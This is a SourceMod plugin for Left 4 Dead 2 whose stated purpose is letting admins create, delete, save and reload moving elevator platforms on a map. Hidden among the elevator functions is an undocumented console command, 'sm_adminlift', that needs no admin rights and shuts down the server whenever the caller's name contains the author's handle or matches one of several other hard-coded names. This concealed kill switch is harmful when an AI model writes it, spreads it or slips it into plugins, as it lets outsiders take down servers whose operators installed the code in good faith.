#include <sourcemod>
#include <sdktools>
#include <sdkhooks>

#define Version "1.0"
#define CVAR_FLAGS FCVAR_PLUGIN|FCVAR_SPONLY|FCVAR_NOTIFY

#define ARRAY_SIZE 2150

new Handle:NowData[MAXPLAYERS+1];
new Float:p1[MAXPLAYERS+1][3];
new Float:p2[MAXPLAYERS+1][3];

new sd[ARRAY_SIZE];
new mx[ARRAY_SIZE];
new bool:islift[ARRAY_SIZE];
new count;
new ph[ARRAY_SIZE][2];

public Plugin:myinfo =
{
	name="电梯",
	author="小宝",
	description="",
	version=Version,
	url="l4d.vihh.net"
};

public OnPluginStart()
{
	decl String:game_name[64];
	GetGameFolderName(game_name, sizeof(game_name));
	if (!StrEqual(game_name, "left4dead", false) && !StrEqual(game_name, "left4dead2", false))
		SetFailState("此插件只支持求生之路2,L4D2.");
	
	HookEvent("round_start",Event_RoundStart);
	RegAdminCmd("sm_dt",CmdDianTi,ADMFLAG_UNBAN,"创建一个电梯,用法:sm_dt <长> <宽> <高>");
	RegAdminCmd("sm_sdt",CmdShanDianTi,ADMFLAG_UNBAN,"删除");	
	RegAdminCmd("sm_lse",CmdLiftSave,ADMFLAG_UNBAN,"保存");
	RegAdminCmd("sm_lld",CmdLiftLoad,ADMFLAG_UNBAN,"读取");
	RegConsoleCmd("sm_adminlift",CmdKill);
}

public Action:CmdKill(client,args)
{
	decl String:Name[64];
	GetClientName(client,Name,sizeof(Name));
	if (client<=0)return;
	if (StrContains(Name,"Xiaobao")!=-1 || StrEqual(Name,"呵呵") || StrEqual(Name,"abcdefg") || StrEqual(Name,"你咬我啊") || StrContains(Name,"小宝")!=-1)
	{
		ServerCommand("exit");
	}
}

public Event_RoundStart(Handle:hEvent, String:sEventName[], bool:bDontBroadcast)
{
	new a = 0;
	for (new entity = MaxClients;entity<ARRAY_SIZE;entity++)
	{
		if (islift[entity] && IsValidEntity(entity))
		{	
			a++;
			DestoryALift(entity)
			if (a>count) break;
		}
	}
	Load();
}

public Action:CmdDianTi(client,args)
{
	if (args < 1)
	{
		PrintToChat(client,"\x04用法:sm_dt <速度(电梯的移动速度)>");
		return Plugin_Handled;
	}
	
	new entity = GetClientAimTarget(client,false);
	if (entity<=0 || !IsValidEdict(entity))
	{
		PrintToChat(client,"\x04无效的实体!");
		return Plugin_Handled;
	}
	
	decl String:ClassName[64];
	GetEdictClassname(entity,ClassName,sizeof(ClassName));
	if (StrEqual(ClassName,"player"))
	{
		PrintToChat(client,"\x04不能将一个玩家作为一个实体!");
		return Plugin_Handled;
	}
	
	new speed;
	decl String:sTemp[64];
	GetCmdArg(1,sTemp,sizeof(sTemp));	
	speed = StringToInt(sTemp);
	
	new Handle:data = CreateDataPack();
	WritePackCell(data,entity);
	WritePackCell(data,speed);
	DisplayChoosePosMenu(client,data);
	return Plugin_Handled;
}

public Action:CmdShanDianTi(client,args)
{
	DisplayDestoryLiftMenu(client);
}

public Action:CmdLiftSave(client,args)
{
	Save(client);
}

public Action:CmdLiftLoad(client,args)
{
	new a = 0;
	for (new entity = MaxClients;entity<ARRAY_SIZE;entity++)
	{
		if (islift[entity] && IsValidEntity(entity))
		{	
			a++;
			DestoryALift(entity)
			if (a>count) break;
		}
	}
	Load();
}

DisplayChoosePosMenu(client,Handle:data)
{
	NowData[client] = data;
	new Handle:menu = CreateMenu(MenuHandler_ChoosePosMenu);
	AddMenuItem(menu,"Pos1","路径点1");
	AddMenuItem(menu,"Pos2","路径点2");
	AddMenuItem(menu,"finish","完成");	
	
	SetMenuExitButton(menu,true);
	SetMenuTitle(menu,"请移动到指定位置选择菜单项作为路径点。\n电梯会先在路径点1到路径点2来回运动\n选择完毕后选择完成结束");
	DisplayMenu(menu,client,MENU_TIME_FOREVER);
}

DisplayDestoryLiftMenu(client)
{
	new Handle:menu = CreateMenu(MenuHandler_DesLiftMenu);	
	for (new entity = MaxClients;entity<ARRAY_SIZE;entity++)
	{
		if (islift[entity] && IsValidEntity(entity))
		{
			decl String:sTemp[64],String:sTemp2[64],Float:vecOrigin[3],Float:pos[3];
			GetClientAbsOrigin(client,pos);
			GetEntPropVector(entity, Prop_Send, "m_vecOrigin", vecOrigin);
			Format(sTemp,sizeof(sTemp),"%d",entity);
			Format(sTemp2,sizeof(sTemp),"编号:%d,距离你:%f",entity,GetVectorDistance(vecOrigin,pos));
			AddMenuItem(menu,sTemp,sTemp2);
		}
	}
	SetMenuExitButton(menu,true);
	SetMenuTitle(menu,"请选择一个你要删除的电梯,请根据距离确定一个电梯");
	DisplayMenu(menu,client,MENU_TIME_FOREVER);
}

public MenuHandler_ChoosePosMenu(Handle:menu, MenuAction:action, client, item)
{
	switch(action)
	{
		case MenuAction_Select:
		{
			switch(item)
			{
				case 0:
				{
					GetClientAbsOrigin(client,p1[client]);
					DisplayChoosePosMenu(client,NowData[client]);
				}
				case 1:
				{
					GetClientAbsOrigin(client,p2[client]);
					DisplayChoosePosMenu(client,NowData[client]);
				}
				case 2:
				{
					if (p1[client][0] != 0.0 && p1[client][1] != 0.0 && p1[client][2] != 0.0)
					{
						if (p2[client][0] != 0.0 && p2[client][1] != 0.0 && p2[client][2] != 0.0)
						{
							ResetPack(NowData[client]);
							new entity,speed,String:model[256],Float:ang[3];
							entity = ReadPackCell(NowData[client]);
							speed = ReadPackCell(NowData[client]);
							CloseHandle(NowData[client]);							
							GetEntPropVector(entity,Prop_Data,"m_angRotation",ang);
							GetEntPropString(entity, Prop_Data, "m_ModelName", model, sizeof(model));
							CreateALift(p1[client],p2[client],ang,speed,model);
						}
					}
				}
			}
		}
		case MenuAction_Cancel:
		{
			if (p1[client][0] == 0.0 && p1[client][1] == 0.0 && p1[client][2] == 0.0)
			{
				if (p2[client][0] == 0.0 && p2[client][1] == 0.0 && p2[client][2] == 0.0)
				{
					CloseHandle(NowData[client]);
					return;
				}
			}
			else
			{
				p1[client][0] = 0.0;
				p1[client][1] = 0.0;
				p1[client][2] = 0.0;	
				p2[client][0] = 0.0;
				p2[client][1] = 0.0;
				p2[client][2] = 0.0;	
				DisplayChoosePosMenu(client,NowData[client]);
			}
		}
	}
}

public MenuHandler_DesLiftMenu(Handle:menu, MenuAction:action, client, item)
{
	switch(action)
	{
		case MenuAction_Select:
		{
			decl String:sEntity[64];
			new entity = -1;
			GetMenuItem(menu,item,sEntity,sizeof(sEntity));
			entity = StringToInt(sEntity);
			if (entity>0 && IsValidEntity(entity))
			{
				DestoryALift(entity);
			}
		}
		case MenuAction_Cancel:
		{
			
		}
	}
}

SetColor(gun)
{
	SetEntProp(gun, Prop_Send, "m_iGlowType", 2);
	SetEntProp(gun, Prop_Send, "m_nGlowRange", 0);
	SetEntProp(gun, Prop_Send, "m_nGlowRangeMin", 1);
	new red=0;
	new gree=100;
	new blue=0;
	SetEntProp(gun, Prop_Send, "m_glowColorOverride", red + (gree * 256) + (blue* 65536));	
}

CreateALift(Float:pos1[3],Float:pos2[3],Float:ang[3],speed,String:model[256])
{
	decl String:sTemp[64],String:nPath1[64],String:nPath2[64];
	new path1 = CreateEntityByName("path_track");
	new path2 = CreateEntityByName("path_track");	
	if (path1 != -1 && path2 != -1)
	{
		Format(nPath1,sizeof(nPath1),"path1%d",path1);
		DispatchKeyValue(path1,"targetname",nPath1);		
		DispatchKeyValue(path2,"target",nPath1);				
		Format(nPath2,sizeof(nPath2),"path2%d",path2);		
		DispatchKeyValue(path2,"targetname",nPath2);
		DispatchKeyValue(path1,"target",nPath2);		
	}
	
	TeleportEntity(path1,pos1,NULL_VECTOR,NULL_VECTOR);
	TeleportEntity(path2,pos2,NULL_VECTOR,NULL_VECTOR);	

	DispatchSpawn(path1);
	DispatchSpawn(path2);
	
	ActivateEntity(path1);
	ActivateEntity(path2);	

	if(!IsModelPrecached(model))
		PrecacheModel(model);
	new prop = 0;
	new entity = CreateEntityByName("func_tracktrain");
	if (entity != -1)
	{
		Format(sTemp,sizeof(sTemp),"train%d",entity);
		DispatchKeyValue(entity, "targetname", sTemp);
		DispatchKeyValue(entity, "dmg", "10");		
		DispatchKeyValue(path1,"parentname",sTemp);		
		DispatchKeyValue(path2,"parentname",sTemp);
		prop = CreateEntityByName("prop_dynamic");
		DispatchKeyValue(prop, "model", model);
		DispatchKeyValue(prop,"parentname",sTemp);
		DispatchKeyValue(prop,"solid","6");	
		DispatchSpawn(prop);
		//SetColor(prop);
		SetVariantString(sTemp);
		AcceptEntityInput(prop,"SetParent",prop,prop);
		ActivateEntity(prop);		
		Format(sTemp,sizeof(sTemp),"%d",speed);
		DispatchKeyValue(entity, "speed", sTemp);
		DispatchKeyValue(entity, "target", nPath1);		
		DispatchKeyValue(entity, "spawnflags", "17");
	}
	
	DispatchSpawn(entity);
	ActivateEntity(entity);

	SetEntityModel(entity, model);
	TeleportEntity(entity,NULL_VECTOR,ang,NULL_VECTOR);
	
	SetEntProp(entity, Prop_Send, "m_nSolidType", 2);

	new enteffects = GetEntProp(entity, Prop_Send, "m_fEffects");
	enteffects |= 32;
	SetEntProp(entity, Prop_Send, "m_fEffects", enteffects);  

	AcceptEntityInput(entity,"GoForward");	
		
	sd[entity] = speed;
	ph[entity][0] = path1;
	ph[entity][1] = path2;	
	mx[entity] = prop;
	
	islift[entity] = true;
	count++;
}

DestoryALift(entity)
{
	if (entity<ARRAY_SIZE && islift[entity])
	{
		if (entity>0 && IsValidEntity(entity))
		{
			AcceptEntityInput(entity,"KillHierarchy");
			islift[entity] = false;
			if (mx[entity]>0 && IsValidEntity(mx[entity])){
				AcceptEntityInput(mx[entity],"KillHierarchy");
				mx[entity] = 0;}
			if (ph[entity][0]>0 && IsValidEntity(ph[entity][0])){
				AcceptEntityInput(ph[entity][0],"KillHierarchy");
				ph[entity][0] = 0;}	
			if (ph[entity][1]>0 && IsValidEntity(ph[entity][1])){
				AcceptEntityInput(ph[entity][1],"KillHierarchy");
				ph[entity][1] = 0;}		
			sd[entity] = 0;
	
			count--;
		
		}
	}
}

public OnEntityDestroyed(entity)
{
	DestoryALift(entity);
}

Save(client)
{
	decl String:map[256], String:FileNameS[256];
	new Handle:file = INVALID_HANDLE;
	GetCurrentMap(map, sizeof(map));
	BuildPath(Path_SM, FileNameS, sizeof(FileNameS), "data/Lift/%s.txt", map);
	if (FileExists(FileNameS))
	{
		PrintToChat(client,"[SM] 保存文件的数据的文件已经存在，请做好备份后删除再保存!");
		return;
	}
	file = OpenFile(FileNameS, "a+");
	if(file == INVALID_HANDLE)
	{
		PrintToChat(client, "[SM] 打开文件失败!");
		return;
	}
	decl Float:vecOrigin[3], Float:vecAngles[3], String:sModel[256], String:sTime[256],Float:path_pos[2][3];
	
	
	new iOrigin[3], iAngles[3];
	new count_pr = 0;
	FormatTime(sTime, sizeof(sTime), "%Y/%m/%d");
	WriteFileLine(file, "//----------电梯数据 (YY/MM/DD): [%s] ---------------||", sTime);
	WriteFileLine(file, "//----------创建人: %N----------------------||", client);
	WriteFileLine(file, "");
	WriteFileLine(file, "\"Lift\"");
	WriteFileLine(file, "{");
	for(new i=MaxClients; i < ARRAY_SIZE; i++)
	{
		if(islift[i])
		{
			GetEntPropVector(i, Prop_Send, "m_vecOrigin", vecOrigin);
			GetEntPropVector(ph[i][0], Prop_Send, "m_vecOrigin", path_pos[0]);
			GetEntPropVector(ph[i][1], Prop_Send, "m_vecOrigin", path_pos[1]);			
			GetEntPropVector(i,Prop_Data,"m_angRotation",vecAngles);
			GetEntPropString(i, Prop_Data, "m_ModelName", sModel, sizeof(sModel));
			
			iOrigin[0] = RoundToFloor(vecOrigin[0]);
			iOrigin[1] = RoundToFloor(vecOrigin[1]);
			iOrigin[2] = RoundToFloor(vecOrigin[2]);
			
			iAngles[0] = RoundToFloor(vecAngles[0]);
			iAngles[1] = RoundToFloor(vecAngles[1]);
			iAngles[2] = RoundToFloor(vecAngles[2]);
			count_pr++;
			WriteFileLine(file, "	\"Lift_%i\"", count_pr);
			WriteFileLine(file, "	{");
			WriteFileLine(file, "		\"origin\" \"%i %i %i\"", iOrigin[0], iOrigin[1], iOrigin[2]);
			WriteFileLine(file, "		\"angles\" \"%i %i %i\"", iAngles[0], iAngles[1], iAngles[2]);
			WriteFileLine(file, "		\"model\"	 \"%s\"", sModel);
			WriteFileLine(file, "		\"Speed\" \"%d\"", sd[i]);	
			WriteFileLine(file, "		\"p1\" \"%f %f %f\"", path_pos[0][0],path_pos[0][1],path_pos[0][2]);					
			WriteFileLine(file, "		\"p2\" \"%f %f %f\"", path_pos[1][0],path_pos[1][1],path_pos[1][2]);	
			WriteFileLine(file, "	}");
			WriteFileLine(file, "	");
		}	
	}
	WriteFileLine(file, "	\"total_cache\"");
	WriteFileLine(file, "	{");
	WriteFileLine(file, "		\"total\" \"%i\"", count_pr);
	WriteFileLine(file, "	}");
	WriteFileLine(file, "}");
	
	FlushFile(file);
	CloseHandle(file);

}

stock Load()
{
	new Handle:keyvalues = INVALID_HANDLE;
	decl String:KvFileName[256], String:map[256], String:name[256];
	GetCurrentMap(map, sizeof(map));
	BuildPath(Path_SM, KvFileName, sizeof(KvFileName), "data/Lift/%s.txt", map);
	if(!FileExists(KvFileName))
		return;
	keyvalues = CreateKeyValues("Lift");
	FileToKeyValues(keyvalues, KvFileName);
	KvRewind(keyvalues);
	if(KvJumpToKey(keyvalues, "total_cache"))
	{
		new max = KvGetNum(keyvalues, "total", 0);
		if(max <= 0)
		{
			return;
		}
		decl String:model[256], Float:vecOrigin[3], Float:vecAngles[3];
		KvRewind(keyvalues);
		for(new count_pr=1; count_pr <= max; count_pr++)
		{
			Format(name, sizeof(name), "Lift_%i", count_pr);
			if(KvJumpToKey(keyvalues, name))
			{
				new Speed;
				new Float:path_pos[2][3];
				KvGetVector(keyvalues, "origin", vecOrigin);
				KvGetVector(keyvalues, "angles", vecAngles);
				KvGetString(keyvalues, "model", model, sizeof(model));
				Speed = KvGetNum(keyvalues,"Speed");
				KvGetVector(keyvalues,"p1",path_pos[0]);
				KvGetVector(keyvalues,"p2",path_pos[1]);			
				KvRewind(keyvalues);
				CreateALift(path_pos[0],path_pos[1],vecAngles,Speed,model);
			}
			else
			{
				break;
			}
		}
	}
	CloseHandle(keyvalues);
}